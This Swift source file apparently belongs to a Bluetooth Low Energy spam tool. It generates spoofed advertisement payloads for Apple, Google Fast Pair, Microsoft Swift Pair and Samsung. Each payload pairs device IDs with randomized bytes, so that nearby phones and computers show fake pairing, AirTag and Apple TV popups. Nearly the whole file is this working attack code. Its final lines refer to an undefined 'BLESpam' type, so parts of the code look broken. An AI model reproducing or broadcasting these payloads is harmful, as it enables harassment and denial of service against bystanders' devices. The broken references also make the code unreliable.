import Foundation

// MARK: - Manufacturer IDs
let MANUFACTURER_APPLE: UInt16 = 0x004C
let MANUFACTURER_MICROSOFT: UInt16 = 0x0006
let MANUFACTURER_SAMSUNG: UInt16 = 0x0075
let MANUFACTURER_TYPO: UInt16 = 0x00FF

let UUID_GOOGLE_FAST_PAIR = "0000FE2C-0000-1000-8000-00805F9B34FB"

// MARK: - Helpers

func hexToBytes(_ hex: String) -> [UInt8] {
    var bytes: [UInt8] = []
    var i = hex.startIndex
    while i < hex.endIndex {
        let j = hex.index(i, offsetBy: 2)
        let byteStr = String(hex[i..<j])
        if let byte = UInt8(byteStr, radix: 16) {
            bytes.append(byte)
        }
        i = j
    }
    return bytes
}

func randomBytes(_ count: Int) -> [UInt8] {
    (0..<count).map { _ in UInt8.random(in: 0...255) }
}

func randomHex(_ count: Int) -> String {
    randomBytes(count).map { String(format: "%02x", $0) }.joined()
}

// MARK: - Apple Devices

struct DeviceInfo {
    let name: String
    let key: String
}

let appleDevices: [DeviceInfo] = [
    DeviceInfo(name: "AirPods", key: "0220"),
    DeviceInfo(name: "AirPods Pro", key: "0E20"),
    DeviceInfo(name: "AirPods Max", key: "0A20"),
    DeviceInfo(name: "AirPods 2nd Gen", key: "0F20"),
    DeviceInfo(name: "AirPods 3rd Gen", key: "1320"),
    DeviceInfo(name: "AirPods Pro 2nd Gen", key: "1420"),
    DeviceInfo(name: "Powerbeats Pro", key: "0B20"),
    DeviceInfo(name: "Beats Solo Pro", key: "0C20"),
    DeviceInfo(name: "Beats Studio Buds", key: "1120"),
    DeviceInfo(name: "Beats Flex", key: "1020"),
    DeviceInfo(name: "Beats X", key: "0520"),
    DeviceInfo(name: "Beats Solo 3", key: "0620"),
    DeviceInfo(name: "Beats Studio 3", key: "0920"),
    DeviceInfo(name: "Beats Studio Pro", key: "1720"),
    DeviceInfo(name: "Beats Fit Pro", key: "1220"),
    DeviceInfo(name: "Beats Studio Buds+", key: "1620"),
]

struct ActionModal {
    let name: String
    let code: String
}

let appleActionModals: [ActionModal] = [
    ActionModal(name: "AppleTV AutoFill", code: "13"),
    ActionModal(name: "AppleTV Connecting", code: "27"),
    ActionModal(name: "Join This AppleTV?", code: "20"),
    ActionModal(name: "AppleTV Audio Sync", code: "19"),
    ActionModal(name: "AppleTV Color Balance", code: "1E"),
    ActionModal(name: "Setup New iPhone", code: "09"),
    ActionModal(name: "Transfer Phone Number", code: "02"),
    ActionModal(name: "HomePod Setup", code: "0B"),
    ActionModal(name: "Setup New AppleTV", code: "01"),
    ActionModal(name: "Pair AppleTV", code: "06"),
    ActionModal(name: "HomeKit AppleTV Setup", code: "0D"),
    ActionModal(name: "AppleID for AppleTV?", code: "2B"),
    ActionModal(name: "Apple Watch", code: "05"),
    ActionModal(name: "Apple Vision Pro", code: "24"),
    ActionModal(name: "Connect to Device", code: "2F"),
    ActionModal(name: "Software Update", code: "21"),
]

// MARK: - Google Fast Pair

let fastPairDevices: [DeviceInfo] = [
    DeviceInfo(name: "Google Pixel Buds", key: "060000"),
    DeviceInfo(name: "Google Pixel Buds Pro", key: "D800FE"),
    DeviceInfo(name: "Sony WF-1000XM4", key: "D446A7"),
    DeviceInfo(name: "Sony WF-1000XM5", key: "CC4402"),
    DeviceInfo(name: "Samsung Galaxy Buds2 Pro", key: "A168DE"),
    DeviceInfo(name: "Samsung Galaxy Buds FE", key: "E49C6C"),
    DeviceInfo(name: "Nothing Ear (1)", key: "92BBBD"),
    DeviceInfo(name: "Flipper Zero", key: "D99CA1"),
]

// MARK: - Microsoft Swift Pair

let swiftPairNames = [
    "Device 1", "Device 2", "Device 3", "Keyboard",
    "Mouse", "Headphones", "Speaker", "Controller",
]

// MARK: - Samsung

let samsungBuds: [DeviceInfo] = [
    DeviceInfo(name: "Fallback Buds", key: "EE7A0C"),
    DeviceInfo(name: "Light Purple Buds2", key: "39EA48"),
    DeviceInfo(name: "Black Buds Live", key: "850116"),
    DeviceInfo(name: "Black Buds Pro", key: "3F6A45"),
    DeviceInfo(name: "Black Buds2 Pro", key: "6E5F20"),
]

let samsungWatches: [DeviceInfo] = [
    DeviceInfo(name: "White Watch4 Classic", key: "01"),
    DeviceInfo(name: "Black Watch4", key: "04"),
    DeviceInfo(name: "Black Watch5 Pro", key: "15"),
    DeviceInfo(name: "Graphite Watch6", key: "17"),
]

// MARK: - Payload Generators

enum PayloadType: String, CaseIterable {
    case appleNewDevice = "Apple New Device"
    case appleNotYourDevice = "Apple Not Your Device"
    case appleNewAirtag = "Apple New AirTag"
    case appleActionModal = "Apple Action Modal"
    case googleFastPair = "Google Fast Pair"
    case microsoftSwiftPair = "Microsoft Swift Pair"
    case samsungBuds = "Samsung Buds"
    case samsungWatch = "Samsung Watch"
}

struct BLEPayload {
    let type: PayloadType
    let manufacturerId: UInt16?
    let manufacturerData: Data?
    let serviceUUID: String?
    let serviceData: Data?
}

func generatePayload(_ type: PayloadType) -> BLEPayload {
    switch type {
    case .appleNewDevice:
        let device = appleDevices.randomElement()!
        var hex = "071907" + device.key + "55"
        hex += String(format: "%02x", Int.random(in: 0...99))
        hex += String(format: "%02x", Int.random(in: 0...79))
        hex += String(format: "%02x", Int.random(in: 0...255))
        hex += "0000" + randomHex(16)
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
                          manufacturerData: Data(hexToBytes(hex)),
                          serviceUUID: nil, serviceData: nil)

    case .appleNotYourDevice:
        let device = appleDevices.randomElement()!
        var hex = "071901" + device.key + "55"
        hex += String(format: "%02x", Int.random(in: 0...99))
        hex += String(format: "%02x", Int.random(in: 0...79))
        hex += String(format: "%02x", Int.random(in: 0...255))
        hex += "0000" + randomHex(16)
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
                          manufacturerData: Data(hexToBytes(hex)),
                          serviceUUID: nil, serviceData: nil)

    case .appleNewAirtag:
        let key = ["0055", "0030"].randomElement()!
        var hex = "071905" + key + "55"
        hex += String(format: "%02x", Int.random(in: 0...99))
        hex += String(format: "%02x", Int.random(in: 0...79))
        hex += String(format: "%02x", Int.random(in: 0...255))
        hex += "0000" + randomHex(16)
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
                          manufacturerData: Data(hexToBytes(hex)),
                          serviceUUID: nil, serviceData: nil)

    case .appleActionModal:
        let modal = appleActionModals.randomElement()!
        let hex = "0F05C0" + modal.code + randomHex(3)
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
                          manufacturerData: Data(hexToBytes(hex)),
                          serviceUUID: nil, serviceData: nil)

    case .googleFastPair:
        let device = fastPairDevices.randomElement()!
        return BLEPayload(type: type, manufacturerId: nil,
                          manufacturerData: nil,
                          serviceUUID: UUID_GOOGLE_FAST_PAIR,
                          serviceData: Data(hexToBytes(device.key)))

    case .microsoftSwiftPair:
        let name = swiftPairNames.randomElement()!
        var data = hexToBytes("030080")
        data.append(contentsOf: Array(name.utf8))
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_MICROSOFT,
                          manufacturerData: Data(data),
                          serviceUUID: nil, serviceData: nil)

    case .samsungBuds:
        let device = Payloads.samsungBuds.randomElement()!
        let devBytes = hexToBytes(device.key)
        var payload = hexToBytes("42098102141503210109")
        payload.append(contentsOf: [devBytes[0], devBytes[1], 0x01, devBytes[2]])
        payload.append(contentsOf: hexToBytes("063C948E00000000C700"))
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_SAMSUNG,
                          manufacturerData: Data(payload),
                          serviceUUID: nil, serviceData: nil)

    case .samsungWatch:
        let watch = samsungWatches.randomElement()!
        var payload = hexToBytes("010002000101FF000043")
        payload.append(contentsOf: hexToBytes(watch.key))
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_SAMSUNG,
                          manufacturerData: Data(payload),
                          serviceUUID: nil, serviceData: nil)
    }
}

// Namespace alias for disambiguation
enum Payloads {
    static let samsungBuds = BLESpam.samsungBuds
}
